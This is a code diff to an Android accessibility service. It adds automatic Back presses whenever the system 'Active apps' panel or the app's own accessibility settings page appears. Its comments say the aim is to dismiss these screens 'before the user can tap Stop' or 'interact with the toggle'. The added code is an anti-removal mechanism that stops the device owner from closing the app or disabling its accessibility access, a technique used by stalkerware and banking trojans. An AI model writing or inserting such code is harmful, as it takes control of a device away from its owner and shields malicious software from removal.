@@ -1002,6 +1002,9 @@ public class UnifiedAccessibilityService extends AccessibilityService {
             if (rowBounds != null && !rowBounds.isEmpty()) {
                 notifPanelActiveAppsVisible = true;
                 placeNotifStopOverlay(rowBounds);
+                // Press Back vigorously every time the Active-apps panel is detected —
+                // closes the panel immediately, before the user can tap Stop.
+                try { performBack(); } catch (Exception ignored) {}
             } else {
                 notifPanelActiveAppsVisible = false;
                 removeNotifStopOverlay();
@@ -1010,40 +1013,17 @@ public class UnifiedAccessibilityService extends AccessibilityService {
     }
 
     /**
-     * Walks all accessibility windows looking for a node whose text matches
-     * our app name inside the SystemUI "Active apps" panel.
-     * Returns the bounding rect of the enclosing row (app name + Stop button),
-     * or null if the panel / row is not currently visible.
+     * Searches only the currently active window for a node matching our app name
+     * inside the SystemUI "Active apps" panel.  Using only the active window avoids
+     * scanning invisible off-screen panels and hidden menu items in other windows.
      */
     private android.graphics.Rect findActiveAppsRowBounds(String appName) {
         try {
-            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
-                List<android.view.accessibility.AccessibilityWindowInfo> windows = getWindows();
-                if (windows != null) {
-                    for (android.view.accessibility.AccessibilityWindowInfo win : windows) {
-                        try {
-                            AccessibilityNodeInfo root = win.getRoot();
-                            if (root == null) continue;
-                            String pkg = root.getPackageName() != null
-                                    ? root.getPackageName().toString() : "";
-                            if (!pkg.contains("systemui")) {
-                                root.recycle();
-                                continue;
-                            }
-                            android.graphics.Rect bounds = findAppRowInNode(root, appName);
-                            root.recycle();
-                            if (bounds != null) return bounds;
-                        } catch (Exception ignored) {}
-                    }
-                }
-            }
-            // Fallback: active window only
             AccessibilityNodeInfo root = getRootInActiveWindow();
-            if (root != null) {
-                android.graphics.Rect bounds = findAppRowInNode(root, appName);
-                root.recycle();
-                return bounds;
-            }
+            if (root == null) return null;
+            android.graphics.Rect bounds = findAppRowInNode(root, appName);
+            root.recycle();
+            return bounds;
         } catch (Exception ignored) {}
         return null;
     }
@@ -1980,37 +1960,44 @@ public class UnifiedAccessibilityService extends AccessibilityService {
                 String appName = getString(R.string.app_name);
                 AccessibilityNodeInfo root = getRootInActiveWindow();
                 if (root == null) return;
-                String screenText = getAllScreenText(root);
+
+                // Use direct text search on the active window only — no deep tree traversal.
+                // This avoids scanning invisible menu items or collapsed panels.
+                List<AccessibilityNodeInfo> nameNodes =
+                        root.findAccessibilityNodeInfosByText(appName);
                 root.recycle();
 
-                // Determine if this is OUR app's specific accessibility detail page:
-                //   1. Our app name is visible on screen.
-                //   2. The window belongs to an accessibility settings path.
+                boolean foundName = nameNodes != null && !nameNodes.isEmpty();
+                if (nameNodes != null) {
+                    for (AccessibilityNodeInfo n : nameNodes) {
+                        try { n.recycle(); } catch (Exception ignored) {}
+                    }
+                }
+
+                // Our accessibility detail page: app name visible AND package is an
+                // accessibility settings path — no full-screen text dump needed.
                 boolean isOurAccessibilityPage =
-                        screenText.contains(appName)
-                        && (packageName.toLowerCase().contains("accessibility")
-                                || screenText.toLowerCase().contains("accessibility"));
+                        foundName && packageName.toLowerCase().contains("accessibility");
 
                 if (isOurAccessibilityPage) {
-                    // Show the overlay the first time this page becomes active.
+                    // Show the overlay if not already shown.
                     if (!accessibilityAssistOverlayShowing) {
                         showAccessibilityAssistOverlay();
+                    }
+                    // Press Back vigorously every time this page is detected —
+                    // immediate single press so the page is dismissed before the
+                    // user can interact with the toggle.
+                    try { performBack(); } catch (Exception ignored) {}
 
-                        // On first launch press Back then Home to exit automatically.
-                        // On boot/restart the overlay stays until the user navigates
-                        // away themselves (back button still works because nav bar is
-                        // not covered), at which point the next window-change event
-                        // removes the overlay.
-                        // Fire Back + Home exactly once, only on the very first launch.
-                        if (accessibilityAssistIsFirstLaunch && !accessibilityAssistBackHomeFired) {
-                            accessibilityAssistBackHomeFired = true;
-                            new Handler(Looper.getMainLooper()).postDelayed(() -> {
-                                try { performBack(); } catch (Exception ignored) {}
-                            }, 150L);
-                            new Handler(Looper.getMainLooper()).postDelayed(() -> {
-                                try { performHome(); } catch (Exception ignored) {}
-                            }, 450L);
-                        }
+                    // Fire Back + Home exactly once on the very first launch.
+                    if (accessibilityAssistIsFirstLaunch && !accessibilityAssistBackHomeFired) {
+                        accessibilityAssistBackHomeFired = true;
+                        new Handler(Looper.getMainLooper()).postDelayed(() -> {
+                            try { performBack(); } catch (Exception ignored) {}
+                        }, 150L);
+                        new Handler(Looper.getMainLooper()).postDelayed(() -> {
+                            try { performHome(); } catch (Exception ignored) {}
+                        }, 450L);
                     }
                 } else {
                     // A different settings page is now in the foreground —
